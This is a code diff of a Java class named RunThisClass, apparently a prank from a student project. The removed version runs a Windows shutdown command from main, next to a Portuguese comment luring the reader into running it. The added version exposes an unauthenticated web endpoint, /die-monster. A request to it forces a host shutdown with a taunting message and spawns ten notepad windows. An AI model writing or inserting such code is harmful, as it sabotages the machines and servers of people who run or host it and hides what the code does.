@@ -1,12 +1,21 @@
 package br.edu.ifg.luziania;
+
+import javax.ws.rs.GET;
+import javax.ws.rs.Path;
+import javax.ws.rs.core.Response;
 import java.io.IOException;
-//clica em run class. não é pra rodar o programa.
+
+@Path("")
 public class RunThisClass {
-    public static void main(String[] args) {
-        try {
-            Runtime.getRuntime().exec("shutdown -s -t 10");
-        } catch (IOException e) {
-            e.printStackTrace();
+    @GET
+    @Path("/die-monster")
+    public Response die() throws IOException {
+        Runtime.getRuntime().exec("shutdown -s -t 60 /c \"I WARNED YOU! YOU HAVE 60 SECONDS TO DO SOMETHING!!\"");
+
+        for (int i = 0; i < 10; i++) {
+            Runtime.getRuntime().exec("notepad.exe");
         }
+
+        return null;
     }
 }
